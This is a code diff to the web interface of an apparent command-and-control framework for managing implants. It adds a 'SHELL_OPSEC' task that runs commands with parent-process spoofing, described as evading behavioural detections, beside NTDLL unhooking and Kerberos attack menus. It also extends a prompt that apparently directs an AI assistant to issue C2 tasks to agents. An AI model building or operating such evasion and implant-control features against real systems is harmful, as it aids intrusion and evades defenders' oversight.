@@ -76,8 +76,9 @@ select option{background:var(--bg3)}
 .nav-btn.active{background:var(--bg);color:var(--text);border-color:var(--border);border-bottom-color:var(--bg);margin-bottom:-2px;padding-bottom:2px}
 .nav-btn .badge{background:var(--red);color:#fff;font-size:9px;min-width:14px;height:14px;border-radius:7px;display:flex;align-items:center;justify-content:center;padding:0 3px;line-height:1}
 @keyframes badge-pulse{0%,100%{box-shadow:0 0 0 0 rgba(255,60,60,.7)}60%{box-shadow:0 0 0 5px rgba(255,60,60,0)}}
+@keyframes badge-pulse-green{0%,100%{box-shadow:0 0 0 0 rgba(0,230,118,.7)}60%{box-shadow:0 0 0 5px rgba(0,230,118,0)}}
 .nav-btn .badge.badge-chat-unread{animation:badge-pulse 1.4s ease-out infinite}
-.nav-btn .badge.badge-agents-new{animation:badge-pulse 1.4s ease-out infinite}
+.nav-btn .badge.badge-agents-new{animation:badge-pulse-green 1.4s ease-out infinite}
 .nav-btn.chat-unread{color:var(--text)!important}
 .settings-menu{position:relative;align-self:stretch;display:flex;align-items:flex-end}
 .settings-menu-panel{display:none;position:absolute;right:0;top:calc(100% + 2px);z-index:120;min-width:190px;padding:5px;background:var(--bg2);border:1px solid var(--border2);border-radius:5px;box-shadow:0 10px 24px rgba(0,0,0,.28)}
@@ -579,7 +580,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 <!-- Tab bar (horizontal) -->
 <div id="tabbar">
   <button class="nav-btn active" onclick="showTab('agents')" data-tab="agents">
-    Agents<span class="badge" id="badge-agents" style="display:none">0</span><span class="badge" id="badge-agents-dead" style="display:none;background:var(--red);margin-left:2px;font-size:9px">0</span>
+    Agents<span class="badge" id="badge-agents" style="display:none;background:#00e676;color:#000">0</span><span class="badge" id="badge-agents-dead" style="display:none;background:#666;color:#fff;margin-left:2px;font-size:9px">0</span>
   </button>
   <button class="nav-btn" onclick="showTab('listeners')" data-tab="listeners">Listeners</button>
   <button class="nav-btn" onclick="showTab('payloads')" data-tab="payloads">Payloads</button>
@@ -1481,7 +1482,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 
                 <!-- Dynamic preview -->
                 <div id="ldr-implant-preview" style="font-size:11px;color:var(--green);background:var(--bg4);border-radius:4px;padding:5px 8px;font-family:monospace">
-                  agent_http_go.exe → beacons to 10.0.0.1:8080
+                  loader_http_go.exe → beacons to 10.0.0.1:8080
                 </div>
               </div>
 
@@ -4259,6 +4260,16 @@ async function runCtxAction(act) {
       openModal('modal-socks5');
       break;
     }
+    case 'promptAndTask': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) { toast('No agent selected','error'); break; }
+      showPrompt(act.type, act.prompt || 'Input:', '', val => {
+        if (!val.trim()) return;
+        api('POST', `/api/agents/${aid}/task`, {type: act.type, args: val.trim()})
+          .then(r => { if (r?.ok) { if (!activeAgent || activeAgent.id !== aid) openConsoleFor(aid); pollResult(r.data?.task_id, aid); toast(`${act.type} queued`); } });
+      });
+      break;
+    }
     case 'persistTask': {
       const aid = act.id || activeAgent?.id;
       if (!aid) break;
@@ -5187,6 +5198,8 @@ function agentContextMenu(e, agentId) {
       {label:'Hook Check (EDR)',           action:{fn:'selectAndTask', id, type:'HOOK_CHECK',    args:''}},
       {label:'HW Breakpoint Check',        action:{fn:'selectAndTask', id, type:'HW_BP_CHECK',  args:''}},
       {label:'🔓 NTDLL Unhook',            action:{fn:'selectAndTask', id, type:'NTDLL_UNHOOK', args:''}},
+      null,
+      {label:'🛡 Shell (OPSEC)…',          action:{fn:'promptAndTask', id, type:'SHELL_OPSEC',  prompt:'Command:'}},
     ]},
     {_sub:'AD Attacks', _icon:IC_ATTACK_PATHS, items:[
       {_sub:'Rubeus (Kerberos)', _icon:IC_KEY, items:[
@@ -11499,6 +11512,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
 
   switch(cmd.toLowerCase()) {
     case 'shell': taskType='SHELL'; taskArgs=args; break;
+    case 'shell-s': taskType='SHELL_OPSEC'; taskArgs=args; break;
     case 'ps':    taskType='PS'; break;
     case 'pwd':   taskType='PWD'; break;
     case 'ls':    taskType='LS'; taskArgs=args; break;
@@ -13130,7 +13144,7 @@ function ldrUpdatePreview() {
   const preview = document.getElementById('ldr-implant-preview');
   if (preview) {
     preview.innerHTML =
-      `<span style="color:var(--text3)">Implant:</span> <b>agent_${_ldrTransport}_${_ldrLang}.exe</b>` +
+      `<span style="color:var(--text3)">Implant:</span> <b>loader_${_ldrTransport}_${_ldrLang}.exe</b>` +
       ` <span style="color:var(--text3)">→ beacons to</span> <b>${esc(host)}</b>` +
       `<br><span style="color:var(--text3)">Wrapper:</span> <b>${wrappers[fmt] || fmt}</b>`;
   }
@@ -18763,6 +18777,7 @@ CURRENT AGENT (this console):
 
 AVAILABLE C2 COMMANDS for this ${lang.toUpperCase()} agent — use these EXACT task types in \`\`\`c2 blocks:
 SHELL <cmd>                           Run a shell command${isWin ? ' (cmd.exe)' : ' (sh -c)'}
+SHELL_OPSEC <cmd>                     Run shell command with PPID spoof (cmd.exe → RuntimeBroker/explorer) — evades parent-child behavioral detections
 PS                                    List running processes
 LS_JSON <path>                        List directory contents
 SCREENSHOT                            Capture screen
